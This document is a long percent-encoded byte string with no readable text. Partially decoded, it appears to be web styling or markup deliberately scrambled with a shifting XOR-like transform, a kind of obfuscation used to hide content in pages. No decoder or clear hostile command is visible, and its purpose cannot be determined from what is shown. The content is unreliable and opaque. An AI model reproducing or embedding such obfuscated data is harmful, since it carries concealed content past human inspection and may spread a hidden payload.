38%22%6d%61%61%70%3a%24%33%3d%27%70%6b%6c%6a%75%3c%27%34%3d%24%6b%67%6c%6b%68%71%38%21%32%77%7c%3d%24%61%63%62%6f%69%77%73%76%68%63%3e%20%68%68%6e%60%61%72%2a%6b%73%65%63%6f%67%6a%77%28%3c%32%64%62%6b%2d%26%71%67%72%2c%2c%2f%64%67%65%62%6c%75%2d%2b%24%25%3c%61%37%62%64%36%2e%3f%21%79%08%0e%20%24%23%20%27%22%20%25%2c%74%72%64%70%2f%61%60%72%63%38%68%74%74%66%74%27%79%20%70%71%63%69%77%66%74%70%6e%3c%27%70%72%67%6d%75%6b%61%74%62%59%29%29%33%74%78%2f%3e%20%65%73%78%2a%77%69%65%63%75%79%3e%23%30%27%31%32%75%7a%21%34%33%74%78%24%75%63%75%2a%2f%2a%77%69%65%63%75%79%2f%3e%20%65%73%72%61%65%73%29%62%75%6c%75%71%3a%27%70%69%67%61%29%31%3c%28%33%31%33%2c%35%36%36%29%32%2f%33%2c%39%20%7b%0c%0a%27%22%20%25%22%21%26%27%2a%75%70%60%74%28%69%65%74%6c%21%7b%27%62%71%6a%77%2f%72%69%7a%62%38%21%35%29%3c%72%63%6c%3d%27%67%71%69%73%73%3c%27%72%63%76%2b%2f%28%61%65%60%65%6f%72%2c%39%20%66%60%65%6a%6b%72%74%75%6f%62%3d%24%72%6d%61%63%2f%35%3b%29%31%34%36%2b%36%34%32%2f%30%29%31%2b%38%22%78%6d%63%70%68%3e%23%36%37%72%78%38%22%69%61%6c%6d%68%70%39%20%31%32%70%7d%3f%21%6a%6c%6a%67%2b%6b%67%6c%6b%68%71%38%21%30%37%74%78%39%23%62%76%70%64%62%70%2e%74%64%60%6b%73%76%3a%27%35%30%22%3f%21%69%64%76%69%6f%6d%3a%27%32%20%66%75%75%77%27%37%32%74%7b%3d%27%7d%0f%0f%22%21%26%27%24%20%24%23%2e%72%76%63%71%2d%77%65%6b%73%67%24%7e%20%61%73%6e%71%2d%74%6d%7d%63%3a%24%31%72%60%6d%3d%25%64%70%68%73%2b%79%63%68%69%6f%76%3a%25%3b%31%36%3a%24%6f%67%71%69%6c%6c%2f%67%73%75%72%76%6b%3a%24%37%70%7f%3f%20%60%73%6d%77%75%3e%20%72%60%72%2f%2d%2f%71%65%79%72%28%74%72%6f%6c%63%75%79%2b%38%22%75%61%7f%70%2f%71%6b%63%63%73%79%3f%22%31%26%35%74%78%24%37%70%7f%22%72%6c%60%62%2e%37%28%30%28%33%2c%37%2c%32%2e%3f%21%6a%6c%6a%67%2b%6b%67%6c%6b%68%71%38%21%35%29%36%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%2e%71%77%63%73%2d%6c%66%60%66%6a%27%79%20%62%72%6e%73%2d%75%6e%78%66%3c%27%34%2e%3c%34%72%60%6d%3d%25%67%70%6a%76%76%3a%24%75%63%75%2a%2f%2a%76%66%7e%73%2b%75%63%66%71%69%66%63%77%79%2a%3b%27%70%67%7c%77%2f%73%70%63%6b%77%67%77%75%6b%3a%24%74%70%77%65%72%60%61%74%61%3a%24%6c%63%77%74%60%70%2f%70%72%62%63%6c%6a%69%3e%23%30%29%35%70%7d%3f%21%79%08%0e%0f%0e%23%20%27%22%20%25%22%21%37%2d%24%66%75%71%6f%27%28%31%0a%08%21%26%27%24%20%24%23%20%29%64%71%77%6d%2e%63%76%6a%74%67%68%6e%60%70%20%78%22%63%65%62%69%69%76%72%77%69%66%3a%25%74%62%74%2f%2b%2f%66%6a%2f%62%61%72%61%29%3c%26%65%67%65%69%67%72%76%72%2f%63%69%6d%72%60%76%3a%24%61%6c%70%70%28%36%32%71%7e%2c%39%20%66%72%72%63%65%72%2a%70%62%62%6c%73%75%3e%23%33%33%72%78%38%22%71%65%63%60%6b%6a%6a%3a%27%30%30%75%7a%3c%26%68%67%72%6d%68%6e%28%60%71%71%76%70%69%3d%24%32%30%73%78%3a%22%62%74%70%65%61%75%3e%20%37%73%78%27%77%71%69%69%65%26%71%67%72%2c%2c%2f%6e%6e%63%70%77%2a%3b%27%66%71%7c%2c%75%6f%61%64%74%7b%3b%26%37%24%36%74%7b%20%34%34%70%7d%22%73%6f%65%67%28%34%2f%30%2b%32%2c%35%2c%33%2d%3a%24%7f%0b%09%20%27%22%20%25%22%21%26%29%62%71%76%6c%2f%73%69%74%69%65%21%7b%27%60%6b%71%73%6c%64%79%3a%25%64%6d%61%7f%39%20%67%6f%6b%6e%6c%2f%6e%76%66%69%72%3e%20%61%64%6e%73%65%72%38%22%68%65%77%3e%20%37%33%70%7f%3f%20%6a%61%73%6f%6c%6a%2f%66%72%74%73%73%6f%3f%22%33%36%77%7c%3d%24%66%71%6b%73%72%3f%22%77%65%75%2c%2f%2b%60%65%62%65%6e%71%29%3c%26%78%0b%0a%24%23%20%27%22%20%25%22%2f%60%76%76%6f%2b%77%6b%73%6e%67%25%6a%33%26%7a%24%66%75%6d%74%28%77%6b%7f%65%3b%26%34%2a%35%76%64%6f%3a%22%66%74%6c%75%29%7e%63%6b%6d%6b%74%3d%22%36%35%32%3c%26%78%0b%0a%24%23%20%27%22%20%25%22%2f%60%76%76%6f%2b%6a%72%76%75%70%25%7f%21%69%64%76%69%6f%6d%2f%65%73%74%71%73%6e%3c%27%37%36%74%7b%3d%27%7d%0f%0f%22%21%26%27%24%20%24%23%2e%61%73%72%6a%2d%68%74%76%73%70%24%6f%63%65%65%6c%25%7f%21%62%6c%71%70%68%60%7b%3d%22%62%69%73%64%6b%3a%24%6f%67%71%69%6c%6c%2f%67%73%75%72%76%6b%3a%24%35%70%7f%3f%20%63%73%6f%72%28%7d%67%6f%6a%68%73%38%20%33%32%31%3b%27%61%71%68%72%72%3d%22%76%66%70%29%29%28%67%65%61%64%6e%73%29%3d%25%64%70%68%73%2b%75%6f%79%67%3d%22%30%2b%39%73%61%68%39%20%60%68%75%77%6e%63%7e%38%21%60%6b%63%78%39%23%63%6b%69%69%6b%2d%6a%72%60%6b%75%3e%23%65%60%6c%74%62%70%3c%26%6e%67%70%3e%23%36%77%7a%3d%25%7d%0e%0c%27%24%20%24%23%20%27%22%6b%6b%72%76%72%2b%24%74%63%7b%74%64%70%67%66%22%7c%26%7e%6f%64%70%6b%3a%27%31%30%35%25%3c%26%77%67%64%60%68%6e%6e%38%20%36%36%71%7e%3a%24%62%67%66%6d%6e%70%71%72%6c%65%3c%27%76%69%66%60%28%34%35%2c%37%37%2d%32%35%28%30%2a%3a%2b%3a%22%62%74%70%65%61%75%3e%20%37%73%78%27%77%71%69%69%65%26%71%67%72%2c%2c%2f%65%73%72%61%65%73%2d%3a%24%62%75%71%64%60%70%2f%77%61%65%6d%70%71%3a%24%30%30%77%7a%3d%25%67%70%6a%76%76%3a%24%75%63%75%2a%2f%2a%76%66%7e%73%2b%70%76%68%6f%64%70%7b%2e%3f%21%60%76%6a%74%2b%76%6b%7d%65%3a%25%31%73%61%68%39%20%70%71%63%69%77%6b%71%69%70%68%3d%24%63%68%6f%20%37%2c%35%70%22%66%65%72%63%3d%24%72%77%73%6e%6b%6b%65%3b%26%69%75%6e%63%3e%20%28%7b%67%67%6f%6a%72%28%67%70%74%64%63%75%61%6e%60%65%3b%26%69%75%6e%63%3e%20%78%0d%0a%25%22%21%26%27%24%20%24%68%6e%77%75%74%3f%64%70%63%70%71%2c%24%77%67%7f%76%63%77%65%62%3c%61%75%65%73%76%20%7a%22%62%74%70%65%61%75%2b%65%75%6f%71%75%38%20%73%61%73%2e%28%2b%63%61%66%67%69%76%2b%38%22%63%77%7f%2b%75%6c%60%64%76%7b%3a%25%32%21%36%27%34%20%31%73%78%27%70%69%67%61%29%31%3c%28%33%31%33%2c%35%36%36%29%32%2f%34%2c%39%20%66%60%65%6a%6b%72%74%75%6f%62%3d%24%72%6d%61%63%2f%31%37%29%30%34%2a%33%36%2c%34%2d%3b%2c%3f%20%7a%0d%0b%26%27%24%20%24%23%20%27%76%67%7d%76%62%74%60%67%20%79%23%6f%6c%6c%2f%6d%65%6a%6f%6f%70%3a%24%30%37%37%72%78%38%22%73%61%72%6f%7a%63%39%20%71%65%72%71%69%64%65%6b%39%20%62%72%6e%73%2d%66%66%6d%6a%6a%7c%3e%20%2d%4c%71%69%61%65%74%2b%2d%2f%48%63%6e%68%72%29%2b%2b%57%67%75%6f%72%70%24%4f%75%6d%71%2e%2e%6f%74%6c%70%73%77%67%65%63%3e%20%6b%69%6e%62%2d%69%61%6c%6d%68%70%39%20%34%2c%37%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%67%69%65%75%2b%65%75%74%6e%73%22%7d%25%76%66%7e%73%2b%63%68%68%69%69%38%20%77%69%68%6e%73%39%20%62%72%6e%73%2d%75%6e%78%66%3c%27%34%2e%3c%71%67%68%3f%20%60%73%6d%77%75%3e%20%72%60%72%2f%2d%2f%71%65%79%72%28%71%67%61%72%6e%63%61%72%7e%29%3c%26%68%67%72%6d%68%6e%28%76%71%75%38%21%32%77%7c%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%2e%62%72%72%68%2d%63%60%76%6a%77%69%71%20%79%23%64%6c%77%70%69%61%7a%3c%27%62%6c%63%7b%3d%27%64%6c%62%7a%2e%62%6c%76%67%61%77%6b%76%6c%3a%25%67%70%6a%70%6b%6e%39%23%69%64%72%3a%25%31%33%76%7f%39%20%6b%60%72%6e%69%6e%2a%76%70%76%3d%24%32%34%73%78%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%29%60%74%6b%22%7c%26%77%67%64%60%68%6e%6e%38%20%36%36%71%7e%27%36%30%74%7b%3d%27%60%71%77%66%66%74%3d%24%6e%75%6d%67%3a%22%62%74%70%65%61%75%2b%72%67%67%6b%70%77%3a%25%31%31%76%7f%39%20%62%72%6e%73%2d%79%62%69%68%6e%73%3e%20%32%33%30%3a%22%66%74%6c%75%29%72%6f%7a%63%39%20%34%70%67%6a%3f%21%63%70%76%75%75%71%3a%27%72%71%6e%6c%75%61%75%39%20%70%71%63%69%77%6b%71%69%70%68%3d%24%63%68%6f%20%37%2c%35%70%22%66%65%72%63%3d%24%67%6b%72%72%6c%66%79%3b%26%6c%6a%6c%6f%6d%67%28%64%6c%62%7a%3c%26%64%68%6b%6d%6d%2f%6c%76%67%6a%77%3b%26%62%63%6e%70%64%72%3a%22%6a%72%77%75%6d%61%7f%2f%61%72%6e%73%65%6e%71%38%21%63%60%6a%74%63%71%3d%27%6b%63%75%38%21%3e%77%7c%3d%24%65%6c%60%7a%3a%25%31%3c%26%68%6f%6e%2b%6b%67%6c%6b%68%71%38%21%32%3f%74%78%39%23%7f%08%08%20%25%22%21%26%27%24%20%2a%61%74%69%2d%70%77%69%6e%65%75%7f%20%79%23%62%64%67%6d%6c%70%70%71%69%60%3a%24%6f%6b%69%65%63%77%2d%68%74%64%60%6b%63%6d%74%2f%31%35%32%66%66%6f%2b%24%76%67%71%28%28%2d%63%60%67%66%68%73%2f%2c%24%26%38%65%35%65%63%34%2a%3b%27%61%71%68%72%72%3d%22%79%6d%69%75%61%3a%24%62%75%7b%2f%72%6a%63%61%73%78%3c%27%34%20%30%73%78%27%31%32%75%7a%21%74%6e%66%63%2c%34%3b%2b%31%35%35%2e%33%32%31%28%30%2a%36%2b%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%29%60%74%6b%2d%71%74%6c%6b%63%76%78%3a%6f%73%76%62%70%21%7b%27%66%63%61%6e%69%75%73%77%6b%66%3b%26%6b%6f%6e%63%60%72%28%6b%72%66%66%6a%61%69%70%28%37%36%37%63%65%69%29%22%77%65%75%2c%2f%2b%60%65%62%65%6e%71%2d%69%77%71%63%72%2f%2f%20%22%39%64%3c%67%67%3e%2c%39%20%70%71%63%69%77%66%74%70%6e%3c%27%70%72%67%6d%75%6b%61%74%62%59%29%29%35%74%78%2f%3e%20%65%73%78%2a%77%69%65%63%75%79%3e%23%30%27%34%70%7d%22%32%30%77%7c%20%76%6a%62%64%2a%37%3e%2e%32%33%37%28%32%30%35%2c%37%2c%34%2e%3f%21%79%08%0e%20%24%23%20%27%22%20%25%2c%63%72%69%2b%64%67%6d%69%60%70%20%78%22%63%65%62%69%69%76%72%77%69%66%3a%25%6e%6a%68%60%67%72%2b%6a%72%64%66%6b%62%6c%75%2e%34%31%37%60%64%69%2b%22%76%66%70%29%29%28%60%63%6a%6a%67%75%29%2c%25%27%65%63%35%32%32%32%28%3d%27%67%71%69%73%73%3c%27%7d%68%6f%77%67%3a%22%62%74%7a%2e%73%6f%67%64%75%7a%3a%27%32%20%31%72%79%26%34%36%70%7c%23%72%6e%60%63%2d%30%34%3d%2b%32%38%28%35%38%2b%32%2e%30%29%3c%26%78%0b%0a%24%23%20%27%22%20%25%22%2f%64%73%6a%2f%71%74%65%62%65%75%70%22%7c%26%65%67%65%69%6a%72%76%75%6e%61%38%21%6a%6c%6a%67%67%71%2f%6e%70%63%61%69%66%68%73%2c%33%31%34%64%60%6b%2c%25%74%62%74%2f%2b%2f%71%74%65%62%65%75%70%29%2d%26%22%34%37%3f%35%36%3c%29%3d%25%67%70%6a%76%76%3a%24%7a%68%6c%76%67%38%22%63%77%7f%2b%75%6c%60%64%76%7b%3a%25%32%21%32%77%7c%20%37%31%70%7f%22%72%6c%60%62%2e%34%32%2c%37%3b%37%2b%31%32%3e%2e%31%28%32%2f%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%2e%66%77%6e%28%7b%63%77%6c%6a%68%6e%24%7d%24%61%63%62%6f%69%77%73%76%68%63%3e%20%68%68%6e%60%61%72%2a%6b%73%65%63%6f%67%6a%77%28%34%37%37%61%65%68%2a%27%72%63%76%2b%2f%28%7b%63%77%6c%6a%68%6e%2f%2c%24%26%64%3c%3b%39%35%34%2a%3b%27%61%71%68%72%72%3d%22%79%6d%69%75%61%3a%24%62%75%7b%2f%72%6a%63%61%73%78%3c%27%34%20%30%73%78%27%31%32%75%7a%21%74%6e%66%63%2c%31%34%30%2e%33%32%3a%2d%35%34%28%30%2a%36%2b%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%29%60%74%6b%2d%6a%68%61%75%20%79%23%62%64%67%6d%6c%70%70%71%69%60%3a%24%6f%6b%69%65%63%77%2d%68%74%64%60%6b%63%6d%74%2f%31%35%32%66%66%6f%2b%24%76%67%71%28%28%2d%6b%6b%64%70%2d%2b%24%25%34%3b%3b%34%60%32%2e%3f%21%63%76%68%71%76%39%20%7e%6a%6b%71%65%3c%26%65%75%78%2b%76%68%64%66%71%7c%38%21%36%27%30%70%7c%23%33%35%72%78%25%70%68%64%64%2c%36%28%30%38%35%2e%32%36%30%2d%36%29%31%2b%39%23%7f%08%08%0f%0f%22%21%26%27%24%20%24%23%31%2d%22%6e%74%76%66%73%27%68%6b%71%77%20%2a%22%55%42%41%53%43%4f%24%2a%35%0c%0a%27%22%20%25%22%21%26%27%2a%6e%75%77%67%72%2d%68%62%61%65%61%75%24%7d%0b%09%20%27%22%20%25%22%21%26%27%24%20%24%67%6b%72%72%6c%66%79%3b%26%61%68%67%7c%3e%0f%0d%22%20%25%22%21%26%27%24%20%24%23%20%61%6e%67%7d%2d%65%6d%75%63%65%70%68%71%69%38%20%77%73%78%3b%08%0e%20%24%23%20%27%22%20%25%22%21%26%27%62%6c%63%7b%2f%7e%70%63%75%38%21%7f%75%67%70%39%0c%0a%27%22%20%25%22%21%26%27%24%20%24%23%63%6b%69%69%6b%2d%6a%72%60%6b%75%3e%23%65%60%6c%74%62%70%3c%09%0d%24%20%24%23%20%27%22%20%25%22%21%26%6d%73%75%70%68%66%7c%2d%65%74%6c%75%61%69%70%3a%24%76%70%64%67%67%2a%60%66%72%7e%63%67%6a%3e%0f%0d%22%20%25%22%21%26%27%24%20%24%23%20%6e%61%70%3f%22%32%34%77%7c%3d%0b%09%20%27%22%20%25%22%21%26%27%24%20%24%6c%63%75%6b%6b%6b%2d%63%77%73%70%71%6b%39%20%35%32%70%7d%3f%0e%0c%27%24%20%24%23%20%27%22%7f%0a%08%21%26%27%24%20%24%23%20%29%77%67%66%70%64%6e%28%7d%72%67%73%70%60%70%20%78%0d%0b%26%27%24%20%24%23%20%27%22%20%25%22%71%77%72%6f%74%6f%72%6e%3d%22%72%62%6e%62%72%6c%72%67%39%0c%0a%27%22%20%25%22%21%26%27%24%20%24%23%66%6b%65%78%3f%22%32%26%34%24%32%34%33%70%7f%3f%0f%0f%22%21%26%27%24%20%24%23%20%27%22%20%6a%69%6f%29%7e%6f%64%70%6b%3a%27%30%30%35%72%79%3b%08%0e%20%24%23%20%27%22%20%25%7d%0e%0c%27%24%20%24%23%20%27%22%2e%70%65%62%74%62%6c%2f%6f%6d%70%70%76%20%78%0d%0b%26%27%24%20%24%23%20%27%22%20%25%22%78%6d%63%70%68%3e%23%33%37%32%27%38%0d%0b%26%27%24%20%24%23%20%27%22%20%25%22%71%65%63%60%6b%6a%6a%3a%27%31%32%75%7a%21%35%31%74%78%24%30%32%77%7a%20%31%32%71%7e%3a%0b%0a%24%23%20%27%22%20%25%22%21%26%27%24%62%67%66%6d%6e%70%71%72%6c%65%3c%27%76%69%66%60%28%34%35%2c%37%37%2d%32%35%28%30%2a%3a%2b%3a%0d%0a%25%22%21%26%27%24%20%24%23%20%27%22%62%74%70%65%61%75%3e%20%37%73%78%27%77%71%69%69%65%26%71%67%72%2c%2c%2f%65%73%72%61%65%73%2d%3a%0b%0a%24%23%20%27%22%20%25%22%21%26%27%24%62%75%71%64%60%70%2f%77%61%65%6d%70%71%3a%24%36%30%77%7a%3d%0a%08%21%26%27%24%20%24%23%20%27%22%20%25%67%70%6a%76%76%3a%24%75%63%75%2a%2f%2a%76%66%7e%73%2b%70%76%68%6f%64%70%7b%2e%3f%0e%0c%27%24%20%24%23%20%27%22%20%25%22%21%60%76%6a%74%2b%76%6b%7d%65%3a%25%32%2f%3d%30%76%67%6b%3e%0f%0d%22%20%25%22%21%26%27%24%20%24%23%20%73%70%63%6b%77%6a%72%6c%75%6e%3e%23%63%6b%6e%20%35%2c%34%73%27%63%63%71%64%3d%08%08%20%25%22%21%26%27%24%20%7b%0c%0a%27%22%20%25%22%21%26%27%2a%75%63%60%72%62%6a%2f%6e%6c%71%71%73%3e%66%75%66%77%72%22%7d%0a%08%21%26%27%24%20%24%23%20%27%22%20%25%60%70%74%63%63%72%2b%66%71%6b%73%72%3f%22%77%65%75%2c%2f%2b%60%65%62%65%6e%71%29%3c%09%0d%24%20%24%23%20%27%22%20%25%22%21%26%65%75%78%2b%76%68%64%66%71%7c%38%21%36%27%34%20%34%23%35%77%7a%20%77%6b%63%65%2f%33%3b%28%30%35%37%2e%32%31%34%2d%36%29%36%2b%39%0c%0a%27%22%20%25%22%21%26%27%24%20%24%23%62%64%67%6d%6c%70%70%71%69%60%3a%24%71%69%65%61%28%36%35%2d%34%32%28%34%36%2f%30%29%39%2b%38%0d%0b%26%27%24%20%24%23%20%27%22%20%25%22%70%71%73%68%6b%6a%64%3a%27%6c%71%6b%65%3c%09%0d%24%20%24%23%20%27%22%20%7a%0d%0b%26%27%24%20%24%23%20%27%2c%75%62%61%73%63%6f%2b%6b%61%72%6e%27%7f%0f%0f%22%21%26%27%24%20%24%23%20%27%22%20%75%73%74%6d%73%6f%71%6a%39%20%64%60%75%74%6e%76%72%60%39%0f%0e%23%20%27%22%20%25%22%21%26%27%24%20%68%64%66%73%38%20%36%36%71%7e%3a%0b%0a%24%23%20%27%22%20%25%22%21%26%27%24%74%75%73%3a%27%35%30%22%3f%0e%0c%27%24%20%24%23%20%27%22%20%25%22%21%72%75%67%6e%71%65%71%75%6d%3a%25%76%73%65%69%71%6c%67%77%67%5c%2a%2f%32%32%26%2d%3a%0b%0a%24%23%20%27%22%20%25%22%21%26%27%24%65%75%6f%71%75%38%20%73%61%73%2e%28%2b%74%63%7b%74%28%77%67%60%73%6f%62%64%76%7b%2f%3e%0f%0d%22%20%25%22%21%26%27%24%20%24%23%20%61%73%6e%71%2d%74%6d%7d%63%3a%24%30%72%60%6d%3d%0a%08%21%26%27%24%20%24%23%20%27%22%20%25%72%70%6d%69%70%67%76%2c%67%71%65%6e%71%77%3b%26%69%75%6e%63%3e%0f%0d%22%20%25%22%21%26%27%24%7f%0b%09%20%27%22%20%25%22%21%26%29%6a%71%70%64%75%28%67%71%72%6c%75%26%7a%0b%0a%24%23%20%27%22%20%25%22%21%26%27%24%62%67%66%6d%6e%70%71%72%6c%65%3c%27%68%6b%6a%64%63%75%2d%69%77%61%65%6d%60%6a%74%2c%30%35%30%66%67%6c%2e%21%70%64%76%28%2b%2c%63%62%67%67%6b%76%2a%2a%27%21%38%66%34%65%61%34%2b%38%0d%0b%26%27%24%20%24%23%20%27%22%20%25%22%64%77%6b%75%72%3e%23%79%6f%69%74%62%3f%0e%0c%27%24%20%24%23%20%27%22%20%25%22%21%76%64%60%64%6f%6d%69%3d%22%38%75%7a%21%35%31%74%78%39%0c%0a%27%22%20%25%22%21%26%27%24%20%24%23%62%76%70%64%62%70%2e%74%64%60%6b%73%76%3a%27%30%30%75%7a%3c%09%0d%24%20%24%23%20%27%22%20%25%22%21%26%61%75%6e%70%2c%75%6c%78%67%3f%22%31%28%3f%33%72%63%6c%3d%08%08%20%25%22%21%26%27%24%20%24%23%20%27%64%71%6b%76%2e%7f%60%6f%69%6c%77%3a%27%34%30%35%3f%0e%0c%27%24%20%24%23%20%27%22%20%25%22%21%7f%6c%60%74%6c%39%20%61%69%74%2a%67%70%68%73%63%6e%70%3e%0f%0d%22%20%25%22%21%26%27%24%20%24%23%20%65%73%78%2a%77%69%65%63%75%79%3e%23%30%27%36%70%7d%22%32%34%77%7c%20%76%6a%62%64%2a%37%3e%2e%32%33%37%28%32%30%35%2c%37%2c%35%2e%3f%0e%0c%27%24%20%24%23%20%27%22%20%25%22%21%60%6b%63%78%2b%76%68%75%69%6e%68%38%21%36%3a%0b%0a%24%23%20%27%22%20%25%22%7e%09%0d%24%20%24%23%20%27%22%20%20%6c%70%72%60%71%4c%6f%76%74%27%7f%0f%0f%22%21%26%27%24%20%24%23%20%27%22%20%61%69%74%76%6b%67%7b%3e%23%69%75%69%64%38%0d%0b%26%27%24%20%24%23%20%27%22%20%25%22%68%74%6c%60%2f%70%64%6f%77%6e%63%71%65%2e%63%76%68%77%6b%6d%75%3d%22%33%63%70%3c%09%0d%24%20%24%23%20%27%22%20%25%22%21%26%6e%67%70%3e%23%32%37%72%78%38%0d%0b%26%27%24%20%24%23%20%27%22%20%25%22%6e%65%75%6d%6b%6a%2c%62%76%76%74%74%6d%3b%26%32%36%70%7c%3e%0f%0d%22%20%25%22%21%26%27%24%7f%0b%09%20%27%22%20%25%22%21%26%29%6a%71%70%64%2f%62%61%72%61%22%7c%26%65%67%65%69%6a%72%76%75%6e%61%38%21%70%64%76%28%2b%2c%62%6e%2d%65%66%70%65%2d%3a%24%62%67%66%6d%63%70%71%75%2d%67%6d%6b%70%67%76%39%20%65%6e%77%77%2a%32%36%77%7c%2b%39%23%62%76%70%64%62%70%2e%74%64%60%6b%73%76%3a%27%31%34%75%7a%3c%26%77%67%64%60%68%6e%6e%38%20%37%32%71%7e%3a%24%62%75%71%64%60%70%3a%25%31%71%7e%27%71%71%68%68%64%27%74%63%77%2a%2e%29%6e%68%63%71%76%2b%3a%22%74%77%61%6f%73%6c%70%6b%75%6d%3a%27%61%6c%69%22%31%28%32%71%20%63%60%75%60%3f%20%61%69%74%76%6b%67%7b%3e%23%66%6b%65%78%38%22%67%6a%60%7c%2f%60%68%72%60%67%74%6e%73%6f%3c%27%61%71%68%74%6f%69%3f%20%75%73%74%6d%73%6f%71%6a%39%20%75%65%6c%66%76%6a%70%60%39%20%75%75%67%75%64%6c%74%7b%3b%26%6f%6f%64%60%64%6e%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%29%6c%71%71%65%2e%63%64%76%64%3e%39%62%60%64%71%77%65%21%7b%27%61%71%6a%77%67%69%76%3a%25%2b%28%3b%27%74%71%71%68%74%6c%73%6e%3f%22%62%64%72%75%6c%73%77%67%3a%22%74%74%72%3b%26%37%39%20%68%64%66%73%38%20%35%3f%21%7f%6c%60%74%6c%39%20%31%72%78%38%22%69%61%6c%6d%68%70%39%20%34%32%30%22%3f%21%64%64%61%6d%6d%71%71%70%6c%64%3f%22%6d%6d%69%63%63%76%2c%69%75%61%64%6e%65%6f%72%2f%70%71%24%61%71%73%76%71%6a%2e%21%70%64%76%28%2b%2c%63%62%67%67%6b%76%2a%2a%27%21%38%66%34%65%61%34%2b%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%6c%70%72%60%2b%65%67%71%64%3d%6a%71%73%65%73%26%7a%24%74%76%60%6e%72%64%71%77%6d%3b%26%73%76%63%6a%76%6c%64%76%67%5e%2a%2e%32%77%7c%2b%39%23%62%76%7a%2f%70%6a%62%62%76%7d%3a%24%33%20%34%30%70%7d%22%33%32%77%7c%20%72%60%72%2f%2d%2f%70%6a%62%62%76%7d%2b%39%23%62%76%70%64%62%70%2e%63%76%68%71%76%39%20%75%6b%62%66%2a%36%3d%2b%37%35%34%2f%32%33%34%2c%35%2c%34%2d%3a%24%7f%0b%09%20%27%22%20%25%22%21%26%29%6a%71%70%64%2f%73%69%74%69%65%21%7b%27%62%71%6a%77%2f%72%69%7a%62%38%21%35%29%36%72%63%6c%3d%27%64%71%6b%76%2e%7f%60%6f%69%6c%77%3a%27%3b%30%35%3f%21%69%64%76%69%6f%6d%2f%65%73%74%71%73%6e%3c%27%37%32%74%7b%3d%27%67%71%69%73%73%3c%27%72%63%76%2b%2f%28%76%67%7d%76%2e%76%75%6f%6f%67%71%7b%2c%3f%20%7c%73%73%62%28%66%72%63%60%6d%3d%22%62%77%65%62%6b%28%7d%71%76%67%3d%27%72%63%61%66%6a%68%6e%2b%6c%63%65%74%3d%22%33%35%72%79%3b%27%7b%0f%0e%23%20%27%22%20%25%22%21%28%69%75%74%63%2c%65%76%6c%74%62%6c%75%26%7a%24%65%75%6f%71%75%38%20%73%61%73%2e%28%2b%74%63%7b%74%28%77%67%60%73%6f%62%64%76%7b%2f%3e%20%68%61%72%6c%69%6f%29%65%75%74%70%72%6f%3d%22%33%33%72%79%3b%27%62%6c%63%7b%2f%6e%70%71%7c%38%21%35%3a%24%79%75%71%64%28%60%72%62%61%6c%3c%27%66%72%63%60%6d%28%7b%71%77%66%3c%26%76%72%67%76%65%6c%76%7b%3a%25%6a%6a%62%63%63%6e%39%23%6c%6c%6c%67%2a%6a%66%6d%6e%6c%74%3e%23%33%29%34%3d%25%6d%62%7e%28%6c%67%6f%6a%68%73%38%20%36%32%31%76%7f%39%20%74%72%75%6c%76%6b%74%6c%3b%26%75%63%6c%67%77%6b%71%65%3d%25%72%62%62%63%6f%6e%6d%2c%6c%60%64%74%3f%22%32%36%77%7c%3d%24%65%71%69%76%2f%70%69%7b%61%3d%24%30%2a%38%37%75%65%6f%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%6c%70%72%60%2b%65%75%6d%74%60%6c%74%3f%38%62%60%73%63%72%24%7e%20%62%73%6e%71%65%6f%72%3d%24%29%2d%3e%20%77%73%75%6e%76%6a%77%69%3e%20%67%61%75%76%6e%77%71%65%3c%26%65%75%74%70%72%6f%3d%22%30%38%22%6d%61%61%70%3a%24%33%3d%27%70%6b%6c%6a%75%3c%27%34%3d%24%6b%67%6c%6b%68%71%38%21%33%37%74%78%39%23%62%64%67%6d%6c%70%70%71%69%60%3a%24%6f%6b%69%65%63%77%2d%68%74%64%60%6b%63%6d%74%2f%76%72%66%6c%74%76%64%76%67%6a%77%2c%27%74%63%77%2a%2e%29%65%6d%2f%61%60%72%63%29%2b%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%6c%70%72%60%2b%64%67%77%67%27%7f%20%63%73%6f%72%28%71%6b%7e%64%3a%27%32%2e%3d%70%66%69%3a%24%65%75%6f%71%75%38%20%20%39%35%65%32%66%38%39%23%6f%64%70%69%6e%6c%2e%64%76%70%74%75%6c%3a%27%31%36%75%7a%3c%26%63%6f%75%74%6f%63%7c%38%20%63%6e%66%7e%3a%24%63%68%68%69%69%2d%6b%71%65%6e%73%3d%24%65%63%6d%74%60%70%3d%25%6b%62%76%3d%24%36%74%7b%3d%27%72%63%61%66%6a%68%6e%2b%6c%63%65%74%3d%22%33%35%72%79%3b%27%7b%0f%0e%23%20%27%22%20%25%22%21%28%69%75%74%63%2c%63%62%76%6b%74%6c%74%26%7a%24%64%6f%76%70%6b%61%7b%3f%22%67%6a%60%7c%3d%24%65%6c%60%7a%2f%61%69%73%61%62%70%6b%75%6d%3a%27%67%71%69%75%6e%68%3a%24%69%67%73%3a%27%3a%70%7d%3f%21%69%64%76%69%6f%6d%2f%73%73%70%3f%22%62%71%73%75%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%2e%6a%72%74%60%2d%63%60%76%6a%77%69%71%20%2a%61%74%69%22%7d%25%72%62%62%63%6f%6e%6d%39%20%34%32%70%7d%3f%21%60%76%6a%74%2b%76%6b%7d%65%3a%25%32%2f%3d%75%63%6f%39%23%62%76%70%64%62%70%2e%74%64%60%6b%73%76%3a%27%3a%70%7d%3f%21%69%6c%6a%2f%6c%64%6b%6e%6a%74%3f%22%35%32%77%7c%3d%24%7c%0f%0d%0d%0a%25%22%21%26%27%24%20%24%32%2a%27%6d%71%61%61%6d%26%2d%35%0f%0e%23%20%27%22%20%25%22%21%28%68%75%64%67%6f%20%7a%22%64%6e%77%71%6a%64%7f%3a%24%6d%71%69%65%3d%25%72%70%73%6c%70%6b%75%6d%3a%27%64%6b%7d%65%65%3b%27%70%71%74%39%20%37%3f%20%69%65%67%72%3d%24%30%39%23%79%6c%66%74%6d%38%21%35%37%34%27%39%23%68%60%69%69%6d%76%3b%26